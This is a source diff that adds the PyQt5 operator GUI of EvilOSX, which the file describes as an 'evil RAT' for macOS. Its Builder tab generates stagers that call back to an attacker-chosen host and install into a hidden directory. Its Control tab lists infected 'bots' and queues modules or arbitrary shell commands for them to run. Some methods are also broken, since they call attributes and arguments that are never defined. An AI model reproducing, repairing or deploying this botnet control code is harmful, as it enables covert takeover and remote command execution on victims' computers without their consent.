@@ -1,0 +1,660 @@
+# -*- coding: utf-8 -*-
+from typing import List
+
+__author__ = "Marten4n6"
+__license__ = "GPLv3"
+
+from os import path
+from time import strftime, localtime
+from uuid import uuid4
+
+from PyQt5.Qt import QApplication, QMainWindow, QTabWidget, QTableWidget, QWidget, QPalette, QColor, QPixmap, \
+    QLabel, QHBoxLayout, QGridLayout, QSplitter, QAbstractItemView, QHeaderView, QTableWidgetItem, \
+    QComboBox, QLineEdit, QPushButton, QVBoxLayout, QMessageBox, QTextEdit
+from PyQt5.QtCore import Qt
+
+from bot import launchers, loaders
+from server import modules
+from server.version import VERSION
+from server.view.helper import *
+from server.modules.helper import ModuleViewABC
+from server.model import Bot, Command, CommandType
+
+
+class _BuilderTab(QWidget):
+    """Handles the creation of launchers."""
+
+    def __init__(self):
+        super().__init__()
+
+        self._layout = QVBoxLayout()
+
+        host_label = QLabel("Server host (where EvilOSX will connect to):")
+        self._host_field = QLineEdit()
+
+        self._layout.addWidget(host_label)
+        self._layout.addWidget(self._host_field)
+
+        port_label = QLabel("Server port:")
+        self._port_field = QLineEdit()
+
+        self._layout.addWidget(port_label)
+        self._layout.addWidget(self._port_field)
+
+        live_label = QLabel("Where should EvilOSX live? (Leave empty for ~/Library/Containers/.<RANDOM>): ")
+        self._live_field = QLineEdit()
+
+        self._layout.addWidget(live_label)
+        self._layout.addWidget(self._live_field)
+
+        launcher_label = QLabel("Launcher name:")
+        self._launcher_combobox = QComboBox()
+
+        for launcher_name in launchers.get_names():
+            self._launcher_combobox.addItem(launcher_name)
+
+        self._layout.addWidget(launcher_label)
+        self._layout.addWidget(self._launcher_combobox)
+
+        loader_label = QLabel("Loader name:")
+        loader_combobox = QComboBox()
+        self._loader_layout = QVBoxLayout()
+
+        for loader_name in loaders.get_names():
+            loader_combobox.addItem(loader_name)
+
+        self._layout.addWidget(loader_label)
+        self._layout.addWidget(loader_combobox)
+        loader_combobox.currentTextChanged.connect(self._set_on_loader_change)
+
+        # Dynamically loaded loader layout
+        self._layout.addLayout(self._loader_layout)
+        self._set_on_loader_change(loader_combobox.currentText())
+
+        self._layout.setContentsMargins(10, 10, 10, 0)
+        self._layout.setAlignment(Qt.AlignTop)
+        self.setLayout(self._layout)
+
+    def _set_on_loader_change(self, new_text: str):
+        """Handles the loader combobox change event."""
+        while self._loader_layout.count():
+            child = self._loader_layout.takeAt(0)
+
+            if child.widget():
+                child.widget().deleteLater()
+
+        input_fields = []
+
+        for message in loaders.get_option_messages(new_text):
+            input_field = QLineEdit()
+
+            self._loader_layout.addWidget(QLabel(message))
+            self._loader_layout.addWidget(input_field)
+            input_fields.append(input_field)
+
+        create_button = QPushButton("Create launcher")
+        create_button.setMaximumWidth(250)
+        create_button.setMinimumHeight(30)
+        create_button.pressed.connect(lambda: self._on_create_launcher(
+            self._host_field.text(), self._port_field.text(), self._live_field.text(),
+            new_text, self._launcher_combobox.currentText(), input_fields
+        ))
+
+        self._loader_layout.addWidget(QLabel(""))
+        self._loader_layout.addWidget(create_button)
+
+    @staticmethod
+    def display_error(text: str):
+        """Displays an error message to the user."""
+        message = QMessageBox()
+
+        message.setIcon(QMessageBox.Critical)
+        message.setWindowTitle("Error")
+        message.setText(text)
+        message.setStandardButtons(QMessageBox.Ok)
+        message.exec_()
+
+    @staticmethod
+    def display_info(text: str):
+        message = QMessageBox()
+
+        message.setIcon(QMessageBox.Information)
+        message.setWindowTitle("Information")
+        message.setText(text)
+        message.setStandardButtons(QMessageBox.Ok)
+        message.exec_()
+
+    def _on_create_launcher(self, server_host, server_port, program_directory, loader_name: str,
+                            launcher_name: str, input_fields: list):
+        """Creates the launcher and outputs it to the builds directory."""
+        if not self._host_field.text():
+            self.display_error("Invalid host specified.")
+        elif not str(self._port_field.text()).isdigit():
+            self.display_error("Invalid port specified.")
+        else:
+            set_options = []
+
+            for field in input_fields:
+                set_options.append(field.text())
+
+            loader_options = loaders.get_options(loader_name, set_options)
+            loader_options["program_directory"] = program_directory
+
+            stager = launchers.create_stager(server_host, server_port, loader_options)
+
+            launcher_extension, launcher = launchers.generate(launcher_name, stager)
+            launcher_path = path.realpath(path.join(
+                path.dirname(__file__), path.pardir, path.pardir, "data", "builds", "Launcher-{}.{}".format(
+                    str(uuid4())[:6], launcher_extension
+                )))
+
+            with open(launcher_path, "w") as output_file:
+                output_file.write(launcher)
+
+            self.display_info("Launcher written to: \n{}".format(launcher_path))
+
+
+class _BroadcastTab(QWidget):
+    """Tab used to interact with the whole botnet at once."""
+
+    def __init__(self, model):
+        super().__init__()
+
+        self._model = model
+
+        layout = QVBoxLayout()
+        label = QLabel("This tab is not yet implemented.")
+
+        label.setAlignment(Qt.AlignTop)
+        layout.addWidget(label)
+
+        self.setLayout(layout)
+
+
+class _ResponsesTab(QTabWidget):
+    """Tab which shows all module and shell responses."""
+
+    def __init__(self):
+        super().__init__()
+
+        layout = QVBoxLayout()
+        self._output_field = QTextEdit()
+
+        self._output_field.setDisabled(True)
+        self._output_field.setPlaceholderText("There are currently no responses.")
+
+        layout.addWidget(self._output_field)
+        self.setLayout(layout)
+
+    def clear(self):
+        """Clears all output."""
+        self._output_field.clear()
+
+    def output(self, text: str):
+        """Adds a line to the output field."""
+        self._output_field.append(text)
+
+
+class ModuleView(ModuleViewABC):
+    """Used by modules to interact with this GUI."""
+
+    def display_error(self, message: str):
+        super().display_error(message)
+
+    def display_info(self, message: str):
+        super().display_info(message)
+
+    def should_continue(self, messages: List[str], continue_message: str = None) -> bool:
+        return super().should_continue(messages, continue_message)
+
+    def output(self, message: bytes, separator: bool = False):
+        super().output(message, separator)
+
+
+class _ExecuteTab(QTabWidget):
+    """Tab used to execute modules or shell commands on the selected bot."""
+
+    def __init__(self, model):
+        super().__init__()
+
+        self._model = model
+        self._current_layout = None
+        self._current_bot = None
+
+        self._layout = QGridLayout()
+        self._sub_layout = QVBoxLayout()
+        self._module_view = ModuleView()
+
+        self._layout.setAlignment(Qt.AlignTop)
+        self.setLayout(self._layout)
+        self.set_empty_layout()
+
+    def set_current_bot(self, bot: Bot):
+        """Sets the connected bot this tab will interact with."""
+        self._current_bot = bot
+
+    def _clear_layout(self):
+        while self._layout.count():
+            child = self._layout.takeAt(0)
+
+            if child.widget():
+                child.widget().deleteLater()
+        while self._sub_layout.count():
+            child = self._sub_layout.takeAt(0)
+
+            if child.widget():
+                child.widget().deleteLater()
+
+    def set_empty_layout(self):
+        """Default layout shown when the user has not yet selected a row."""
+        self._current_layout = "Empty"
+        self._clear_layout()
+
+        self._layout.addWidget(QLabel("Please select a bot in the table above."), 0, 0)
+
+    def set_module_layout(self, module_name: str = "screenshot"):
+        """Sets the layout which can execute modules."""
+        self._current_layout = "Module"
+        self._clear_layout()
+
+        command_type_label = QLabel("Command type: ")
+        command_type_combobox = QComboBox()
+
+        command_type_combobox.addItem("Module")
+        command_type_combobox.addItem("Shell")
+
+        module_label = QLabel("Module name: ")
+        module_combobox = QComboBox()
+
+        for module_name in modules.get_names():
+            module_combobox.addItem(module_name)
+
+        module_combobox.currentTextChanged.connect(self._on_module_change)
+        command_type_combobox.currentTextChanged.connect(self._on_command_type_change)
+
+        self._layout.setColumnStretch(1, 1)
+        self._layout.addWidget(command_type_label, 0, 0)
+        self._layout.addWidget(command_type_combobox, 0, 1)
+        self._layout.addWidget(module_label, 1, 0)
+        self._layout.addWidget(module_combobox, 1, 1)
+
+        # Module layout
+        cached_module = modules.get_module(module_name)
+
+        if not cached_module:
+            cached_module = modules.load_module(module_name, ModuleView(), self._model)
+
+        input_fields = []
+
+        for option_name in cached_module.get_setup_messages():
+            input_field = QLineEdit()
+
+            self._sub_layout.addWidget(QLabel(option_name))
+            self._sub_layout.addWidget(input_field)
+            input_fields.append(input_field)
+
+        run_button = QPushButton("Run")
+        run_button.setMaximumWidth(250)
+        run_button.setMinimumHeight(25)
+
+        run_button.pressed.connect(lambda: self._on_module_run(module_combobox.currentText()))
+
+        self._sub_layout.addWidget(QLabel(""))
+        self._sub_layout.addWidget(run_button)
+        self._sub_layout.setContentsMargins(0, 15, 0, 0)
+        self._layout.addLayout(self._sub_layout, self._layout.rowCount() + 2, 0, 1, 2)
+
+        self._on_module_change(module_combobox.currentText())
+
+    def set_shell_layout(self):
+        """Sets the layout which can execute shell commands."""
+        self._current_layout = "Shell"
+        self._clear_layout()
+
+        command_type_label = QLabel("Command type: ")
+        command_type_combobox = QComboBox()
+
+        command_type_combobox.addItem("Shell")
+        command_type_combobox.addItem("Module")
+
+        command_label = QLabel("Command:")
+        command_input = QLineEdit()
+
+        run_button = QPushButton("Run")
+        run_button.setMaximumWidth(250)
+        run_button.setMinimumHeight(25)
+
+        command_type_combobox.currentTextChanged.connect(self._on_command_type_change)
+        run_button.pressed.connect(lambda: self._on_command_run(command_input.text()))
+
+        self._layout.addWidget(command_type_label, 0, 0)
+        self._layout.addWidget(command_type_combobox, 0, 1)
+        self._layout.addWidget(command_label, 1, 0)
+        self._layout.addWidget(command_input, 1, 1)
+
+        self._sub_layout.addWidget(QLabel(""))
+        self._sub_layout.addWidget(run_button)
+        self._sub_layout.setContentsMargins(0, 15, 0, 0)
+        self._layout.addLayout(self._sub_layout, self._layout.rowCount() + 2, 0, 1, 2)
+
+    def _on_command_type_change(self, text: str):
+        """Handles the command type combobox change event."""
+        if text == "Module":
+            self.set_module_layout()
+        else:
+            self.set_shell_layout()
+
+    def _on_module_change(self, module_name: str):
+        """Handles module combobox changes."""
+        while self._sub_layout.count():
+            child = self._sub_layout.takeAt(0)
+
+            if child.widget():
+                child.widget().deleteLater()
+
+        cached_module = modules.get_module(module_name)
+
+        if not cached_module:
+            cached_module = modules.load_module(module_name, ModuleView(), self._model)
+
+        for option_name in cached_module.get_setup_messages():
+            self._sub_layout.addWidget(QLabel(option_name))
+            self._sub_layout.addWidget(QLineEdit())
+
+        run_button = QPushButton("Run")
+        run_button.setMaximumWidth(250)
+        run_button.setMinimumHeight(25)
+
+        self._sub_layout.addWidget(QLabel(""))
+        self._sub_layout.addWidget(run_button)
+        self._sub_layout.setContentsMargins(0, 15, 0, 0)
+
+    def _on_module_run(self, module_name: str, input_fields: list):
+        """Handles running modules."""
+        set_options = []
+
+        for input_field in input_fields:
+            set_options.append(input_field.text())
+
+        module = modules.get_module(module_name)
+
+        if not module:
+            module = modules.load_module(module_name, self, self._model)
+
+        successful, options = module.setup(set_options)
+
+        if module_name == "remove_bot":
+            code = loaders.get_remove_code(self._connected_bot.loader_name)
+        elif module_name == "update_bot":
+            code = loaders.get_update_code(self._connected_bot.loader_name)
+        else:
+            code = modules.get_code(module_name)
+
+        self._model.add_command(self._connected_bot.uid, Command(
+            CommandType.MODULE, code, options
+        ))
+
+        self.output("Module added to the queue of \"{}@{}\".".format(
+            self._connected_bot.username, self._connected_bot.hostname
+        ), "info")
+
+    def _on_command_run(self, command: str):
+        """Handles running commands."""
+        if command.strip() == "":
+            return
+
+        self._model.add_command(self._current_bot.uid, Command(CommandType.SHELL, command.encode()))
+
+
+class _BotTable(QTableWidget):
+    """Table which holds all bots."""
+
+    def __init__(self):
+        super().__init__()
+
+        self._header_labels = ["UID", "Username", "Version", "Last Seen"]
+
+        self.setColumnCount(len(self._header_labels))
+        self.setHorizontalHeaderLabels(self._header_labels)
+
+        self.setSelectionBehavior(QAbstractItemView.SelectRows)
+        self.setAlternatingRowColors(True)
+        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
+        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
+
+        for i in range(len(self._header_labels)):
+            self.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)
+
+    def set_on_selection_changed(self, callback_function):
+        self.itemSelectionChanged.connect(callback_function)
+
+    def add_bot(self, bot: Bot):
+        """Adds a bot to the table."""
+        self.setRowCount(self.rowCount() + 1)
+        created_row = self.rowCount() - 1
+
+        self.setItem(created_row, 0, QTableWidgetItem(bot.uid))
+        self.setItem(created_row, 1, QTableWidgetItem(bot.username + "@" + bot.hostname))
+        self.setItem(created_row, 2, QTableWidgetItem(""))
+        self.setItem(created_row, 3, QTableWidgetItem(
+            strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
+        ))
+
+    def remove_bot(self, bot: Bot):
+        """Removes a bot from the table."""
+        pass
+
+
+class _InteractWidget(QTabWidget):
+    """Tabbed widget used to interact with the selected bot."""
+
+    def __init__(self, bot_table: _BotTable, model):
+        super().__init__()
+
+        self._bot_table = bot_table
+        self._model = model
+
+        self._execute_tab = _ExecuteTab(model)
+        self._responses_tab = _ResponsesTab()
+
+        self.addTab(self._execute_tab, "Execute")
+        self.addTab(self._responses_tab, "Responses")
+
+        self._register_listeners()
+
+    def _register_listeners(self):
+        self._bot_table.set_on_selection_changed(self.on_selection_changed)
+
+    def on_selection_changed(self):
+        bot_uid = self._bot_table.item(self._bot_table.currentColumn(), 0).text()
+
+        self._execute_tab.set_module_layout()
+        self._execute_tab.set_current_bot(self._model.get_bot(bot_uid))
+        self._responses_tab.clear()
+
+    def get_execute_tab(self) -> _ExecuteTab:
+        return self._execute_tab
+
+    def get_responses_tab(self) -> _ResponsesTab:
+        return self._responses_tab
+
+
+class _ControlTab(QWidget):
+    """Tab which allows the user to control individual bots."""
+
+    def __init__(self, model):
+        super().__init__()
+
+        layout = QGridLayout()
+        splitter = QSplitter()
+
+        self._table = _BotTable()
+        self._interact_widget = _InteractWidget(self._table, model)
+
+        splitter.setOrientation(Qt.Vertical)
+        splitter.addWidget(self._table)
+        splitter.addWidget(self._interact_widget)
+        splitter.setSizes([50, 100])
+
+        layout.addWidget(splitter)
+        self.setLayout(layout)
+
+    def get_table(self) -> _BotTable:
+        return self._table
+
+    def get_interact_widget(self) -> _InteractWidget:
+        return self._interact_widget
+
+
+class _HomeTab(QWidget):
+    """Home tab which contains information about EvilOSX."""
+
+    def __init__(self):
+        super().__init__()
+
+        self._layout = QHBoxLayout()
+        self.setLayout(self._layout)
+
+        message_label = QLabel("""\
+        Welcome to <b>EvilOSX</b>:<br/>
+        An evil RAT (Remote Administration Tool) for macOS / OS X.<br/><br/><br/>
+
+        Author: Marten4n6<br/>
+        License: GPLv3<br/>
+        Version: <b>{}</b>
+        """.format(VERSION))
+        logo_label = QLabel()
+
+        logo_path = path.join(path.dirname(__file__), path.pardir, path.pardir, "data", "images", "logo_334x600.png")
+        logo_label.setPixmap(QPixmap(logo_path))
+
+        self._layout.setAlignment(Qt.AlignCenter)
+        self._layout.setSpacing(50)
+        self._layout.addWidget(message_label)
+        self._layout.addWidget(logo_label)
+
+
+class _TabbedWidget(QTabWidget):
+    """Widget which holds all tabs."""
+
+    def __init__(self, model):
+        super().__init__()
+
+        self._home_tab = _HomeTab()
+        self._control_tab = _ControlTab(model)
+        self._broadcast_tab = _BroadcastTab(model)
+        self._builder_tab = _BuilderTab()
+
+        self.addTab(self._home_tab, "Home")
+        self.addTab(self._control_tab, "Control")
+        self.addTab(self._broadcast_tab, "Broadcast")
+        self.addTab(self._builder_tab, "Builder")
+
+    def get_home_tab(self) -> _HomeTab:
+        return self._home_tab
+
+    def get_control_tab(self) -> _ControlTab:
+        return self._control_tab
+
+    def get_broadcast_tab(self) -> _BroadcastTab:
+        return self._broadcast_tab
+
+    def get_builder_tab(self) -> _BuilderTab:
+        return self._builder_tab
+
+
+class _MainWindow(QMainWindow):
+    """Main GUI window which displays the tabbed widget."""
+
+    def __init__(self, central_widget: QWidget):
+        super().__init__()
+
+        self.setGeometry(0, 0, 1000, 680)
+        self.setCentralWidget(central_widget)
+
+
+class _QDarkPalette(QPalette):
+    """Dark palette for a Qt application."""
+
+    def __init__(self):
+        super().__init__()
+
+        self._color_white = QColor(255, 255, 255)
+        self._color_black = QColor(0, 0, 0)
+        self._color_red = QColor(255, 0, 0)
+        self._color_primary = QColor(53, 53, 53)
+        self._color_secondary = QColor(35, 35, 35)
+        self._color_tertiary = QColor(42, 130, 218)
+
+        self.setColor(QPalette.Window, self._color_primary)
+        self.setColor(QPalette.WindowText, self._color_white)
+        self.setColor(QPalette.Base, self._color_secondary)
+        self.setColor(QPalette.AlternateBase, self._color_primary)
+        self.setColor(QPalette.ToolTipBase, self._color_white)
+        self.setColor(QPalette.ToolTipText, self._color_white)
+        self.setColor(QPalette.Text, self._color_white)
+        self.setColor(QPalette.Button, self._color_primary)
+        self.setColor(QPalette.ButtonText, self._color_white)
+        self.setColor(QPalette.BrightText, self._color_red)
+        self.setColor(QPalette.Link, self._color_tertiary)
+        self.setColor(QPalette.Highlight, self._color_tertiary)
+        self.setColor(QPalette.HighlightedText, self._color_black)
+
+    def apply(self, application: QApplication):
+        """Apply this theme to the given application."""
+        application.setStyle("Fusion")
+        application.setPalette(self)
+        application.setStyleSheet("QToolTip {{"
+                                  "color: {white};"
+                                  "background-color: {tertiary};"
+                                  "border: 1px solid {white};"
+                                  "}}".format(white="rgb({}, {}, {})".format(*self._color_white.getRgb()),
+                                              tertiary="rgb({}, {}, {})".format(*self._color_tertiary.getRgb())))
+
+
+class ViewGUI(ViewABC):
+    """This class interacts with the user via a graphical user interface.
+
+    Used by the controller to communicate with the view.
+    """
+
+    def __init__(self, model, server_port: int):
+        self._model = model
+        self._server_port = server_port
+
+        self._application = QApplication([])
+        self._tabbed_widget = _TabbedWidget(model)
+        self._main_window = _MainWindow(self._tabbed_widget)
+
+        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, str(server_port)))
+
+        _QDarkPalette().apply(self._application)
+
+    def get_tabbed_widget(self) -> QWidget:
+        return self._tabbed_widget
+
+    def on_response(self, response: str):
+        responses_tab = self._tabbed_widget.get_control_tab().get_interact_widget().get_responses_tab()
+
+        responses_tab.output("-" * 5)
+
+        for line in response.splitlines():
+            responses_tab.output(line)
+
+    def on_bot_added(self, bot: Bot):
+        self._tabbed_widget.get_control_tab().get_table().add_bot(bot)
+        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
+            VERSION, str(self._server_port), self._model.get_bot_amount()
+        ))
+
+    def on_bot_removed(self, bot: Bot):
+        bot_table = self._tabbed_widget.get_control_tab().get_table()
+
+        bot_table.remove_bot(bot)
+
+    def on_bot_path_change(self, bot: Bot):
+        super().on_bot_path_change(bot)
+
+    def start(self):
+        self._main_window.show()
+        self._application.exec_()
